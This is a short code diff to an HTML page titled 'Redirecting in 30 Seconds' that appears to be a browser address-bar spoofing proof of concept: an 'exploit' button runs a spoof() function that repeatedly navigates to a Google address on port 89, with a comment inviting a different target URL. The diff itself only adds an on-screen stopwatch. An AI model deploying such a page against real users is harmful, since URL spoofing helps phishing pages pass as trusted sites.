@@ -6,10 +6,19 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Redirecting in 30 Seconds</title>
   <script>
+     let startTime = null;
+    let intervalId = null;
     function spoof(){
     
 location = "https://www.google.com:89";
 location = "https://www.google.com:89";
+      startTime = performance.now();
+
+      intervalId = setInterval(() => {
+        const now = performance.now();
+        const elapsed = (now - startTime) / 1000;
+        document.getElementById("stopwatch").textContent = `${elapsed.toFixed(2)} s`;
+      }, 100); // Update every 100ms
       setInterval(function() {
         location = "https://www.google.com:89"; // Change this to your target URL
       }, 30000); 
@@ -18,5 +27,6 @@ location = "https://www.google.com:89";
 </head>
 <body>
   <input type="button" value="exploit" onclick="spoof();" />
+   <div id="stopwatch">0.00 s</div>
 </body>
 </html>
